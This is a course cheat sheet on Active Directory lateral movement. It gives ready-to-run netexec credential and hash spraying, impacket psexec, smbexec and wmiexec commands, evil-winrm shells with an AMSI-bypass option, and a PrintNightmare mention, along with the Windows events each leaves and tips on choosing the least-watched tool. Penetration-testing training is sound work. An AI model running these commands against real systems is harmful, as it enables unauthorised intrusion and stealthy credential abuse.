# Cheat sheet — Lateral Movement

*Companion to [Module 06 — Lateral Movement](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only test Active Directory environments you own or have explicit written permission to test.

## Map the estate — netexec (nxc / crackmapexec)

```bash
nxc smb 10.10.0.0/24                                  # alive hosts, OS, hostname, domain, SIGNING
nxc smb 10.10.0.0/24 -u jsmith -p 'Welcome1!'         # which hosts accept the credential (spray)
nxc smb 10.10.0.0/24 -u jsmith -H <NThash>            # spray a hash (pass-the-hash)
nxc smb 10.10.0.0/24 -u admin  -p 'P@ss' --local-auth # local account, not domain
nxc smb 10.10.0.0/24 -u jsmith -p 'Welcome1!' -x 'whoami'   # run a command where it lands
nxc smb 10.10.0.0/24 -u jsmith -p 'Welcome1!' --gen-relay-list targets.txt  # hosts WITHOUT signing
```

The `(signing:False)` marker in the sweep output is the NTLM-relay attack surface — collect those hosts.

## Execute — the three impacket primitives (pick by artefact)

```bash
# Syntax: domain/user:password@target   (add -hashes LM:NT to pass-the-hash instead of a password)

# psexec — creates a service + drops a binary in ADMIN$ → Event 7045, binary on disk. Loudest.
psexec.py corp.local/administrator:'P@ss'@10.10.0.20
psexec.py corp.local/administrator@10.10.0.20 -hashes :31d6c...              # PtH

# smbexec — temporary service, NO binary drop → still Event 7045, quieter on disk.
smbexec.py corp.local/administrator:'P@ss'@10.10.0.20

# wmiexec — WMI/DCOM, no service → Event 4688 (process create), NOT 7045. Often least-watched.
wmiexec.py corp.local/administrator:'P@ss'@10.10.0.20
wmiexec.py corp.local/administrator@10.10.0.20 -hashes :31d6c...
```

| Tool | Protocol | Primitive | Key event | Binary on disk? |
|---|---|---|---|---|
| `psexec.py`  | SMB | service install | **7045** | yes (briefly) |
| `smbexec.py` | SMB | temp service    | **7045** | no |
| `wmiexec.py` | DCOM/WMI | Win32_Process | **4688** | no |

All three also leave **Event 4624, Logon Type 3** (network logon) with your source IP.

## WinRM shell — evil-winrm

```bash
evil-winrm -i 10.10.0.20 -u administrator -p 'P@ss'            # password auth (port 5985)
evil-winrm -i 10.10.0.20 -u administrator -H 31d6cfe0...       # pass-the-hash
evil-winrm -i 10.10.0.20 -u administrator -p 'P@ss' -s ./scripts -e ./exes   # upload dirs for AMSI-bypass loads
# In-shell helpers: upload <local> <remote> · download <remote> · menu (load Invoke-* functions)
```

## PrintNightmare — spooler RCE as a movement primitive (CVE-2021-34527)

```bash
# SYSTEM-level RCE via the Print Spooler on nearly every domain host, including DCs.
# Fix: patch AND disable the spooler where it isn't needed. Alert on spooler DLL loads.
```

## Gotchas worth remembering

- **They all "work" — the choice is artefact, not capability.** In a poorly defended domain every
  credential+protocol+primitive combo succeeds; pick the one whose event trail the target isn't watching.
- **SMB signing is *not* required on workstations by default — still.** That single default is what makes
  NTLM relay practical: the attacker relays an already-authenticated session, never cracking anything.
- **The Linux Samba lab won't emit Windows events.** You execute the movement for real, but no 7045/4688/4624
  lands anywhere — the event profile in this module is a *documented* comparison, cross-checked against the impacket source.
- **`wmiexec.py` is the semi-interactive one** — but each command spawns a fresh process (a new 4688).
  `psexec`/`smbexec` give a fuller shell but drop the service event. Match the tool to what you can afford to leave.
- **`--local-auth` matters.** Authenticating a *local* account against a domain host without it fails; the
  domain is assumed. Pass-the-hash of a local admin across a subnet is the classic estate-wide move — one hash, everywhere.
